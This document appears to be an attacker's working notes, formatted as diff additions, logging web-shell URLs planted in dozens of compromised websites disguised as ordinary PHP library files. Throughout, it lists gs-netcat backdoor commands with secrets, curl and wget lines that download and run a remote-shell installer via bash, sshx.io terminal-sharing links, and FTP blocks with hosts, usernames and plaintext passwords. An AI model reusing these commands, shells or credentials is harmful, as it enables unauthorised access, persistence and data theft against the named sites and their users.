+https://vcarevehicles.com/wp-content/plugins/google-listings-and-ads/vendor/googleads/google-ads-php/src/Google/Ads/GoogleAds/V13/Services/ApplyRecommendationOperation/AdAssetApplyParameters/ApplySetup.php
+
+https://vcarevehicles.com/wp-content/themes/xstore/framework/customizer/images/theme-options/woocommerce/single-product/tabs/apaya.php
+
+https://vcarevehicles.com/wp-content/plugins/woocommerce/assets/client/admin/product-editor/blocks/product-fields/product-details-section-description/index.php
+
+https://vcarevehicles.com/wp-admin/css/colors/sunrise/colors.php
+
+--> gs-netcat -s "8GpguVko8u7zWYxfsbFgVd" -i
+
+--> S="8GpguVko8u7zWYxfsbFgVd" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="8GpguVko8u7zWYxfsbFgVd" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://altmoversdubai.com/wp-content/plugins/google-site-kit/third-party/phpseclib/phpseclib/phpseclib/Math/BigInteger/Engines/BCMath/Reductions/SetData.php
+
+https://altmoversdubai.com/wp-content/plugins/elementor-pro/modules/assets-manager/asset-types/icons/import-export-customization/impor-revert.php
+
+https://altmoversdubai.com/wp-content/cache/all/search/%7Bsearch_term_string%7D/feed/rss2/index.php
+
+https://altmoversdubai.com/wp-includes/js/tinymce/skins/wordpress/images/setan.php
+
+--> gs-netcat -s "GWvjVdt4hkNAHNVCWKzb3N" -i
+
+--> S="GWvjVdt4hkNAHNVCWKzb3N" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="GWvjVdt4hkNAHNVCWKzb3N" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://3next.jp/wp-content/plugins/all-in-one-wp-migration-file-extension/lib/view/import/import-helper.php
+
+https://3next.jp/wp-content/plugins/all-in-one-wp-migration/lib/vendor/bandar/bandar/lib/Exceptions/ptsmc.php
+
+https://3next.jp/wp-content/themes/story_tcd041/pagebuilder/assets/admin/js/admin.php
+
+https://3next.jp/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/P4.php
+
+S="6JK8MGQkTMn9CgcNxo9ekh" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://kaneprofessional.com/bitrix/components/bitrix/catalog/templates/.default_old/bitrix/catalog.search/.default/bitrix/search.page/.default/lang/.default.php
+
+https://kaneprofessional.com/bitrix/modules/landing/install/components/bitrix/landing.demo/data/xml/clothes/en/catalog_files/iblock/23f/index.php
+
+https://kaneprofessional.com/bitrix/modules/im/install/js/im/v2/component/content/chat/src/components/content/base/components/chat-header/components/entity-link/css/images/js.php
+
+https://kaneprofessional.com/bitrix/modules/landing/install/js/landing/ui/panel/formsettingspanel/src/internal/content/crm/internal/stagefield/css/yipi.php?p=
+
+gs-netcat -s DnJoNXQFLZ5JFCVygfrxGF -i
+
+
+
+
+
+
+
+https://www.kesaricourier.com/plugins/jstree/demo/filebrowser/data/root/assets/dist/themes/default/.default.php
+
+https://www.kesaricourier.com/views/razorpay/razorpay-php/libs/Requests-1.6.1/library/Requests/Exception/HTTP/522.php
+
+https://www.kesaricourier.com/views/razorpay/razorpay-php/libs/Requests-1.6.1/library/Requests/Utility/MappingIterator.php
+
+--> gs-netcat -s "F2yh1xHiUj3ry3wvf8hKUw" -i
+
+--> S="F2yh1xHiUj3ry3wvf8hKUw" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="F2yh1xHiUj3ry3wvf8hKUw" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://tender.opalindia.in/static/media/.default.php
+
+https://tender.opalindia.in/static/js/devinition.php
+
+https://tender.opalindia.in/.usermin/changepass/apaya.php
+
+--> gs-netcat -s "DNuo1NjjTM39d2dpWmq88C" -i
+
+--> S="DNuo1NjjTM39d2dpWmq88C" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="DNuo1NjjTM39d2dpWmq88C" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://antdigitals.com/wp-content/plugins/post-smtp/Postman/Postman-Mail/libs/vendor_prefixed/phpseclib/phpseclib/phpseclib/Math/BigInteger/Engines/PHP/Reductions/Eval.php
+
+
+
+
+
+
+
+https://www.firstaog.com/wp/wp-content/plugins/gravityformstwilio/includes/twilio/sdk/Twilio/Rest/Api/V2010/Account/Sip/Domain/AuthTypes/AuthTypeRegistrations/AuthRegistrationsCredentialListMappingOptions.php kamusiapaya
+
+https://www.firstaog.com/phpMyAdmin-oX102cfW/vendor/web-auth/cose-lib/src/Algorithm/Signature/RSA/RSB.php
+
+https://www.firstaog.com/wp/wp-inchttps://www.firstaog.com/wp/wp-includes/sodium_compat/namespaced/Core/Curve25519/Ge/P4.phpludes/sodium_compat/namespaced/Core/Curve25519/Ge/P4.php
+
+
+
+--> gs-netcat -s "55i58NZH3GXkxXNCsczhUF" -i
+
+--> S="55i58NZH3GXkxXNCsczhUF" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="55i58NZH3GXkxXNCsczhUF" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://superdong.com.vn/node_modules/next/dist/server/futuredroute-modules/pages/vendored/contexts/.default.php
+
+https://superdong.com.vn/node_modules/next/dist/server/future/route-modules/pages/vendored/contexts/.default.php
+
+https://superdong.com.vn/.next/server/app/(server)/sitemap/post/[id]/index.php
+
+https://superdong.com.vn/.next/static/chunks/app/(page)/weather/page.php
+
+
+
+
+
+
+
+https://monaviscompte.fr/wp-content/plugins/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Service/Command/LocationVisitor/Response/.default.php
+
+https://monaviscompte.fr/wp-content/plugins/google-site-kit/third-party/phpseclib/phpseclib/phpseclib/Math/BigInteger/Engines/PHP/Reductions/admin.php
+
+https://monaviscompte.fr/wp-includes/SimplePie/library/SimplePie/XML/Declaration/9879/parameters.php
+
+https://monaviscompte.fr/wp-content/cache/wp-rocket/monaviscompte.fr/wp-json/contact-form-7/v1/contact-forms/498/feedback/schema/index.php
+
+gs-netcat -s 966ViGGLfM9QjWdm4d64x7 -i
+
+
+
+
+
+https://hoththerapeutics.com/wp-content/updraft/plugins-old/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Service/Command/LocationVisitor/Response/.default.php
+
+https://hoththerapeutics.com/wp-content/updraft/plugins-old/wordfence/crypto/vendor/paragonie/sodium_compat/src/Core/Curve25519/Ge/parameters.php?p=
+
+https://hoththerapeutics.com/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/P4.php
+
+https://hoththerapeutics.com/wp-content/plugins/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Plugin/ErrorResponse/.default.php
+
+https://hoththerapeutics.com/wp-themes.php
+
+https://sshx.io/s/xlNfcdjqQP#kN38wfPtvhl2kD
+
+68.178.223.197
+
+papoy@hoththerapeutics.com
+
+lk7w1fvntg1#
+
+
+
+
+
+https://istoma.com/ygin/modules/user/modules/rbam/extensions/jsTree/assets/themes/default-rtl/.default.php
+
+https://istoma.com/assets/4e24b8b6/ygin/modules/backend/assets/css/jquery-ui/images/.git.php
+
+https://istoma.com/ygin/ext/yii-mail/vendors/swiftMailer/classes/Swift/Transport/Esmtp/Auth/auth.php
+
+https://istoma.com/assets/4e24b8b6/ygin/modules/backend/assets/gfx/index.php
+
+https://istoma.com/ygin/ext/tinymce/assets/tiny_mce/themes/advanced/skins/thebigreason/img/apaya.php
+
+S="9Jp81SV3AyjAdT2YBXFawQ" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://powerslides.com/apaya.php
+
+--> gs-netcat -s "GH6K3CQ4wHz9FKKHuSih2d" -i
+
+--> S="GH6K3CQ4wHz9FKKHuSih2d" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="GH6K3CQ4wHz9FKKHuSih2d" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://www.cypelatam.com/wp-content/plugins/forminator/addons/pro/googlesheet/lib/external/vendor-prefixed/phpseclib/phpseclib/phpseclib/Crypt/Common/Formats/Signature/.default.php
+
+https://www.cypelatam.com/wp-content/plugins/fluent-smtp/includes/libs/google-api-client/build/vendor/google/apiclient-services/src/Gmail/Resource/.default.php
+
+https://www.cypelatam.com/wp-content/plugins/fluent-smtp/includes/libs/google-api-client/build/vendor/phpseclib/phpseclib/phpseclib/Math/BigInteger/Engines/PHP/Reductions/index.php
+
+https://www.cypelatam.com/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/configration.php
+
+
+
+
+
+
+
+
+
+https://jacaremoto.com.br/wp-content/plugins/reviews-feed/vendor/smashballoon/customizer/sb-common/sb-customizer/src/Components/Screens/Collections/Sections/Single/Form/.default.php
+
+S="Ap3G1JH5Qw3a5ZUyyTPQH6" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://merakki.in/wp-content/themes/astra/inc/builder/type/header/woo-cart/assets/js/unminified/.default.php
+
+https://merakki.in/wp-content/plugins/wp-optimize/vendor/team-updraft/lib-onboarding-wizard/Wizard/Onboarding/src/utils/Tooltip/index.php
+
+https://merakki.in/wp-content/plugins/wp-optimize/vendor/rosell-dk/webp-convert/src/Convert/Exceptions/ConversionFailed/.git.php
+
+https://merakki.in/wp-content/plugins/bdthemes-element-pack-lite/admin/optimizer/vendor/matthiasmullie/minify/bin/parameters.php
+
+--> S="AMJLBfDKaReY1XXvs1tvK5" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="AMJLBfDKaReY1XXvs1tvK5" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://colegiopaidoscampeche.edu.mx/innova2/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/P4.php?p=
+
+https://colegiopaidoscampeche.edu.mx/innova2/wp-content/themes/astra/inc/modules/posts-structures/customizer/parameters.php
+
+https://colegiopaidoscampeche.edu.mx/innova2/wp-content/themes/astra/inc/builder/type/header/woo-cart/assets/js/unminified/.default.php
+
+https://colegiopaidoscampeche.edu.mx/innova2/wp-content/plugins/wpvivid-backuprestore/vendor/guzzle/guzzle/src/Guzzle/Service/Command/LocationVisitor/Response/content.php
+
+--> gs-netcat -s "5haun1qhNnRES99DjtXJVF" -i
+
+--> S="5haun1qhNnRES99DjtXJVF" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="5haun1qhNnRES99DjtXJVF" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://technologicsglobal.com/wp-content/plugins/smart-slider-3/Nextend/SmartSlider3/Platform/WordPress/Integration/Divi/V31ge/includes/modules/SmartSlider3/File.php?p=
+
+https://technologicsglobal.com/mystaging02/wp-content/plugins/wp-webhooks/core/includes/integrations/woocommerce/misc/rest-api/vendor/automattic/woocommerce/tests/parameters.php
+
+https://technologicsglobal.com/training/wp-content/plugins/google-listings-and-ads/vendor/googleads/google-ads-php/src/Google/Ads/GoogleAds/V14/Resources/CustomerSkAdNetworkConversionValueSchema/SkAdNetworkConversionValueSchema/Event/cache.php
+
+https://technologicsglobal.com/training/wp-content/plugins/google-listings-and-ads/vendor/googleads/google-ads-php/src/Google/Ads/GoogleAds/V14/Resources/Recommendation/CampaignBudgetRecommendation/.default.php#action=fileman&path=/home/u559756684/domains/technologicsglobal.com/public_html/wp-content/plugins/wp-webhooks/core/includes/integrations/woocommerce/misc/rest-api/vendor/automattic/woocommerce/src/
+
+https://technologicsglobal.com/training/wp-content/plugins/google-listings-and-ads/vendor/googleads/google-ads-php/src/Google/Ads/GoogleAds/V14/Resources/CustomerSkAdNetworkConversionValueSchema/SkAdNetworkConversionValueSchema/Event/content.php#action=fileman&path=/home/u559756684/domains/technologicsglobal.com/public_html/training/wp-content/plugins/google-listings-and-ads/vendor/googleads/google-ads-php/src/Google/Ads/GoogleAds/V14/Resources/CustomerSkAdNetworkConversionValueSchema/SkAdNetworkConversionValueSchema/Event/&file=.htaccess
+
+--> gs-netcat -s "A3JWq7ME53hKS9evCcXcjX" -i
+
+--> S="A3JWq7ME53hKS9evCcXcjX" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="A3JWq7ME53hKS9evCcXcjX" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://kohe.hu/arlista/template/images/flag/.svn/tmp/text-base/Content.php
+
+https://kohe.hu/admin/template/images/flag/.svn/tmp/text-base/parameters.php
+
+https://kohe.hu/ckeditor/_source/plugins/templates/templates/images/cache.php
+
+https://kohe.hu/arlista/template/images/flag/.svn/tmp/.default.php
+
+https://kohe.hu/admin/template/images/flag/.svn/props/.git.php?
+
+--> gs-netcat -s "AJsDjvqvFc4Le4SKfnhzr4" -i
+
+--> S="AJsDjvqvFc4Le4SKfnhzr4" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="AJsDjvqvFc4Le4SKfnhzr4" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+https://sshx.io/s/M32drK4EpA#1Y3YHvU7GybfWq
+
+
+
+
+
+
+
+
+
+https://ceylonhampers.com/wp-content/plugins/woocommerce/packages/email-editor/vendor-prefixed/packages/Symfony/Polyfill/Php80/Resources/stubs/content.php
+
+https://ceylonhampers.com/wp-content/themes/Ceylon-Hampers/less/js_composer/lib/vendor/node_modules/bootstrap3/cache.php
+
+https://ceylonhampers.com/wp-content/plugins/wpseo-local/woocommerce/parameters.php
+
+https://ceylonhampers.com/wp-content/plugins/jetpack/jetpack_vendor/automattic/jetpack-forms/src/dashboard/components/copy-clipboard-button/content.php
+
+--> gs-netcat -s "G2rGNp3hH3K8xhHmFAgami" -i
+
+--> S="G2rGNp3hH3K8xhHmFAgami" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="G2rGNp3hH3K8xhHmFAgami" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://arquitectosdeceuta.com/wp-content/plugins/the-events-calendar/common/vendor/vendor-prefixed/stellarwp/uplink/src/Uplink/API/V3/Auth/Contracts/Auth_Link.php
+
+https://arquitectosdeceuta.com/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/P4.php
+
+https://arquitectosdeceuta.com/wp-content/themes/Divi/Core.php
+
+--> gs-netcat -s "GaDo5GXWyKzsjn4NAJWBVA" -i
+
+--> S="GaDo5GXWyKzsjn4NAJWBVA" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="GaDo5GXWyKzsjn4NAJWBVA" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+https://arquitectosdeceuta.com/wp-admin/ arquitectosdeceutaADM | adminptsmc
+
+
+
+
+
+
+
+https://sgzozjasienica.pl/plugins/html5lightbox/pdfjs/web/locale/be/plugins.php
+
+https://sgzozjasienica.pl/lib/datatables.net-plugins/features/slidingChild/database.php
+
+https://sgzozjasienica.pl/plugins/html5lightbox/pdfjs/web/locale/son/.default.php
+
+https://sgzozjasienica.pl/plugins/html5lightbox/pdfjs/web/locale/mk/assets.php
+
+
+
+
+
+
+
+https://ramboimpermeaveis.com.br/wp-content/plugins/woocommerce/packages/email-editor/vendor-prefixed/packages/Symfony/Polyfill/Php80/Resources/stubs/statistic.php
+
+https://ramboimpermeaveis.com.br/wp-content/plugins/tablepress/libraries/vendor/PhpSpreadsheet/Calculation/Financial/CashFlow/Constant/Periodic/content.php
+
+https://ramboimpermeaveis.com.br/wp-content/plugins/js_composer/assets/lib/vendor/dist/@popperjs/core/dist/umd/cache.php
+
+https://ramboimpermeaveis.com.br/wp-includes/fonts/includes/KodExplorer-master/static/js/lib/laydate/theme/default/font/.default.php
+
+https://ramboimpermeaveis.com.br/wp-admin/css/colors/ocean/yii.php
+
+https://ramboimpermeaveis.com.br/wp-content/themes/atomlab/option.php
+
+--> gs-netcat -s "A3aDzXPGfXWKVGRcy38czA" -i
+
+--> S="A3aDzXPGfXWKVGRcy38czA" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="A3aDzXPGfXWKVGRcy38czA" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://iapt.org.in/jaextmanager_data/j16/template/ja_zite/backup/ja_zite_29Dec2015_174139/themes/iapt/images/copyrights/tango/content.php#action=fileman&path=/home/dfzs8a5lehnv/public_html/iapt.org.in/
+
+https://iapt.org.in/components/com_wrapper/views/wrapper/.default.php
+
+https://iapt.org.in/administrator/components/com_akeeba/BackupEngine/Postproc/Connector/Cloudfiles/Exception/Missing/parameters.php
+
+https://iapt.org.in/jaextmanager_data/j16/template/ja_zite/backup/ja_zite_29Dec2015_174139/themes/iapt/images/copyrights/tango/content.php#action=fileman&path=/home/dfzs8a5lehnv/public_html/iapt.org.in/
+
+68.178.151.28 | admin@o7w.1c4.mywebsitetransfer.com | lk7w1fvntg1#
+
+
+
+
+
+
+
+https://yenisehirlioglu.com/wp-admin/css/colors/sunrise/yii.php#action=fileman&path=/var/www/vhosts/yenisehirlioglu.com/httpdocs/wp-admin/css/colors/sunrise/&file=.htaccess
+
+https://yenisehirlioglu.com/wp-content/plugins/updraftplus/vendor/team-updraft/common-libs/src/updraft-semaphore/content.php
+
+https://yenisehirlioglu.com/wp-content/plugins/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Service/Command/LocationVisitor/Response/Response.php?dir=%2Fvar%2Fwww%2Fvhosts%2Fyenisehirlioglu.com%2Fhttpdocs
+
+https://yenisehirlioglu.com/wp-content/themes/betheme/functions/importer/slider-revolution-demo/demos/classic/.default.php
+
+
+
+
+
+
+
+
+
+https://onechat.com.do/wp-admin/css/colors/sunrise/yii.php
+
+https://onechat.com.do/wp-content/plugins/woocommerce/assets/client/admin/product-editor/blocks/generic/product-checkbox-field/ptsmc.php?dir=%2Fhome%2Fu977091139%2Fdomains%2Fonechat.com.do%2Fpublic_html%2Fwp-admin%2Fcss%2Fcolors%2Fsunrise 
+
+https://onechat.com.do/wp-content/themes/flatsome/inc/admin/kirki/modules/webfont-loader/vendor-typekit/src/modules/google/.default.php?dir=%2Fhome%2Fu977091139%2Fdomains%2Fonechat.com.do%2Fpublic_html%2Fwp-includes%2Fwidgets
+
+--> gs-netcat -s "8B28nQP86estcjyRHYRorX" -i
+
+--> S="8B28nQP86estcjyRHYRorX" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="8B28nQP86estcjyRHYRorX" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://egyptyo.com/wp-admin/css/colors/blue/.default.php
+
+gs-netcat -s 85XwSh8XWWPkCci8KYF3hC -i
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : 65.181.113.31
+
+--> Username  : egyptyo_dev@egyptyo.com
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+
+
+
+
+https://vgold.co.in/wp-admin/css/colors/sunrise/yii.php
+
+https://vgold.co.in/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/parameters.php
+
+https://vgold.co.in/dashboard/user/bower_components/ckeditor/plugins/codesnippet/lib/highlight/styles/component.php
+
+https://vgold.co.in/wp-content/uploads/al_opt_content/FONT/vgold.co.in/wp-content/uploads/al_opt_content/FONT/vgold.co.in/wp-content/themes/Avada/includes/lib/content.php
+
+http://vgold.co.in/wp-content/uploads/al_opt_content/FONT/vgold.co.in/wp-content/uploads/al_opt_content/FONT/vgold.co.in/wp-content/themes/Avada/includes/lib/assets/fonts/fontawesome/webfonts/6948e14adb888ac7b18be905/.default.php#action=fileman&path=/home3/vocabuli/public_html/vgoldco/
+
+--> gs-netcat -s "5pYdooCpvUmEqoPoAoCXUB" -i
+
+--> S="5pYdooCpvUmEqoPoAoCXUB" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="5pYdooCpvUmEqoPoAoCXUB" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : 162.214.80.24
+
+--> Username  : vgold_dev@psyprox.com
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+will use
+
+https://workmanservices.com.pk/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/P4.php
+
+https://workmanservices.com.pk/wp-content/plugins/essential-addons-elementor/vendor/google/apiclient/src/Google/Task/.default.php
+
+http://workmanservices.com.pk/wp-content/plugins/revslider/admin/includes/shortcode_generator/divi/includes/modules/RevsliderDivi/images/index.php
+
+https://workmanservices.com.pk/wp-content/plugins/fast-indexing-api/vendor/phpseclib/phpseclib/phpseclib/Math/BigInteger/Engines/PHP/Reductions/content.php
+
+--> gs-netcat -s "FzS7tBKt2iNFNFCuLdp1VS" -i
+
+--> S="FzS7tBKt2iNFNFCuLdp1VS" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="FzS7tBKt2iNFNFCuLdp1VS" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+75.119.135.235
+
+
+
+
+
+
+
+https://bajwahp.com/wp-admin/css/colors/sunrise/yii.php
+
+https://bajwahp.com/wp-content/plugins/elementor/modules/atomic-widgets/dynamic-tags/import-export/auth.php
+
+https://bajwahp.com/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/.default.php
+
+https://bajwahp.com/wp-content/CARREF/px/myfiles/www.carrefour-banque.fr/sites/default/files/_images/credit/pp/2017/content.php
+
+
+
+
+
+
+
+
+
+https://lovingrealtors.com/wp-includes/sodium_compat/src/Core32/SecretStream/yii.php
+
+https://lovingrealtors.com/wp-content/themes/realestate-7/admin/merlin/vendor/monolog/monolog/tests/Monolog/Processor/p4.php
+
+https://lovingrealtors.com/wp-content/updraft/plugins-old/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Plugin/Oauth/parameters.php
+
+https://lovingrealtors.com/wp-content/themes/realestate-7/admin/merlin/vendor/monolog/monolog/src/Monolog/Handler/SyslogUdp/.default.php#action=fileman&path=/home2/loving/public_html/wp-admin/css/colors/blue/&file=index.php
+
+https://lovingrealtors.com/wp-content/updraft/plugins-old/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Service/Command/LocationVisitor/Response/content.php
+
+--> gs-netcat -s "2ZJYKL6fCt3m7tN3yhd4nb" -i
+
+--> S="2ZJYKL6fCt3m7tN3yhd4nb" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="2ZJYKL6fCt3m7tN3yhd4nb" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://dubailicensing.com/application/third_party/domain-parser/layershifter/tld-support/tests/Helpers/network.php
+
+https://dubailicensing.com/vendor/phpspec/prophecy/spec/Prophecy/Doubler/Generator/Node/source.php
+
+https://dubailicensing.com/application/views/admin/cms/slider/aplications.php
+
+https://dubailicensing.com/vendor/mikey179/vfsstream/src/test/php/org/bovigo/vfs/proxy/.default.php
+
+https://dubailicensing.com/vendor/phpunit/php-code-coverage/src/CodeCoverage/Report/HTML/Renderer/Template/js/content.php?
+
+--> gs-netcat -s "Awmj28u4Ho4Tnn2ipdRHoA" -i
+
+--> S="Awmj28u4Ho4Tnn2ipdRHoA" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="Awmj28u4Ho4Tnn2ipdRHoA" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+
+
+https://namariqgroup.com/vendor/ezyang/htmlpurifier/library/HTMLPurifier/TagTransform/network.php
+
+https://namariqgroup.com/vendor/laravel/framework/src/Illuminate/Http/Testing/tiny.php
+
+https://namariqgroup.com/vendor/phpunit/phpunit/src/TextUI/Configuration/Xml/Validator/Conf.php
+
+https://namariqgroup.com/vendor/php-debugbar/php-debugbar/src/DebugBar/Resources/vendor/font-awesome/css/source.php
+
+https://namariqgroup.com/vendor/laravel/framework/src/Illuminate/Foundation/resources/exceptions/renderer/components/icons/content.php
+
+--> gs-netcat -s "DimuR61HEHZpfYU55gYFyE" -i
+
+--> S="DimuR61HEHZpfYU55gYFyE" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="DimuR61HEHZpfYU55gYFyE" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://www.atpeducation.com/admin-atp/ckeditor/plugins/equation/lang/source.php
+
+https://www.atpeducation.com/admin/fold_editor/capture/img/network.php
+
+https://www.atpeducation.com/admin-atp/ckeditor/plugins/image/parameters.php
+
+https://www.atpeducation.com/download/12/CBSE-Sample-Papers/.default.php
+
+
+
+
+
+
+
+
+
+https://britishey.com/_application/libraries/xendit/vendor/phpunit/php-code-coverage/src/Node/source.php
+
+https://britishey.com/_application/libraries/xendit/vendor/squizlabs/php_codesniffer/src/Standards/MySource/Tests/Commenting/source.php
+
+https://britishey.com/_application/libraries/xendit/vendor/squizlabs/php_codesniffer/src/Standards/Squiz/Sniffs/Scope/Engine.php
+
+https://britishey.com/application_8_1_2026/libraries/xendit/vendor/squizlabs/php_codesniffer/src/Standards/MySource/Sniffs/Commenting/network.php
+
+https://britishey.com/application%D9%80%D9%A6%D9%80%D9%A1/libraries/xendit/vendor/phpunit/php-code-coverage/src/Report/Html/Renderer/Template/js/script.php
+
+https://sshx.io/s/uMabib1aCo#2LUw8tvEy6JiQu
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : 69.57.162.246
+
+--> Username  : papoy@apppump.net
+
+--> Password  : lk7w1fvntg1#
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+
+
+
+
+https://roman.net.ua/test/code/converter/fotoshop/photoeditoronline/.git.php
+
+https://roman.net.ua/test/code/converter/docfly/rapidtables/tools/calc/simplifying-fractions-calculator/content.php
+
+https://roman.net.ua/test/code/converter/editor/pixie/viliusle/src/js/modules/effects/common/index.php
+
+https://roman.net.ua/test/code/converter/editor/pixie/viliusle/tools/translator/libs/engine.php
+
+https://sshx.io/s/UDyWExlDbZ#uAKa5S48VkGFBU
+
+
+
+
+
+
+
+
+
+https://aptinverex.com/assets/img/img/product/batteries/batteries.php
+
+https://aptinverex.com/solar-batteries/lithium-ion-battery-25.6v-256kwh/content.php
+
+https://aptinverex.com/assets/sass/template/widgets/widget.php
+
+https://aptinverex.com/products/solar-panels/Mustang/mustang-95-730/context.php
+
+https://aptinverex.com/assets/img/img/update1/testimonial/backup/index.php
+
+--> gs-netcat -s "jX29ga2zoHkEispBbcAEKo" -i
+
+--> S="jX29ga2zoHkEispBbcAEKo" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="jX29ga2zoHkEispBbcAEKo" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://lucuscrossfit.es/staging/wp-content/themes/twentytwentyone/assets/post.php
+
+https://lucuscrossfit.es/staging/wp-includes/sodium_compat/src/cache.php
+
+https://lucuscrossfit.es/staging/wp-admin/css/colors/sunrise/core.php
+
+gs-netcat -s jYsUR9N8zTLB47Ut46615f -i
+
+https://sshx.io/s/ZSxgkrsXgz#amrflisbipZpAo
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : lucuscrossfit.es
+
+--> Username  : admin@lucuscrossfit.es
+
+--> Password  : lk7w1fvntg1#
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+
+
+DOMAIN jamkaspharma.com
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : 198.12.236.107
+
+--> Username  : tn83ryy05rx2adm@swisschem.in
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+
+
+https://noithatledung.vn/wp-content/plugins/woocommerce/packages/woocommerce-blocks/assets/js/base/components/snackbar-list/stories/module.php
+
+gs-netcat -s CkPkJF1etha2GHFxAz1ha8 -i | noithatledung.vn | admin@noithatledung.vn | lk7w1fvntg1#  
+
+
+
+
+
+
+
+https://www.regpl.com/app/webroot/js/ckeditor/filemanager/scripts/jquery.filetree/jqueryFileTree.php
+
+gs-netcat -s 8CPpoXHq8LxvSpKKSvY2Yj -i
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : 103.211.216.141
+
+--> Username  : regpladm@regpl.com
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+
+
+https://samsspc.ru/2hrJ6K88A/J57xKDZX5/ckeditor/samples/toolbarconfigurator/plugins.php
+
+https://samsspc.ru/admin/ckeditor/skins/moono/images/hidpi/index.php
+
+https://samsspc.ru/admin/ckeditor/samples/old/htmlwriter/assets/outputforflash/Output.php
+
+gs-netcat -s "45FtSLXKFrmb4jFnsYbZLE" -i
+
+
+
+
+
+
+
+https://sadomatchatea.com/wp-content/themes/astra/inc/modules/posts-structures/assets/structure.php
+
+gs-netcat -s "3qSC9hpc7CC8wXQPdWRDG4" -i  |  23.235.221.165  |  admin@scentaflora.com  |  lk7w1fvntg1#
+
+
+
+
+
+
+
+
+
+https://bioras-shrimp.eu/wp-includes/sodium_compat/src/Core/Curve25519/Ge/P4.php
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : 162.0.217.27
+
+--> Username  : biorasadm@abtgdev.com
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : bioras-shrimp.eu
+
+============================================
+
+
+
+
+
+
+
+
+
+https://transportpersoaneaustria.ro/wp-includes/Text/Diff/Engine/Core.php
+
+gs-netcat -s 7Lthk75ZPQu52gE4oJFDqx -i
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
